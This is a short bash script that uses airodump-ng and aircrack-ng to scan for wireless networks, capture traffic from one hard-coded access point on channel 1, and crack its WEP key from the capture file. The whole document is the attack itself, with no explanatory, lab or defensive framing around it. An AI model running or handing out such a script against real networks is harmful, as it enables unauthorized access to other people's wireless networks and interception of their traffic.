#!/bin/bash
airodump-ng wlan0
airodump-ng --bssid 6C:72:20:12:6F:C8 -c 1 -w WEPcrack wlan0
aircrack-ng WEPcrack.cap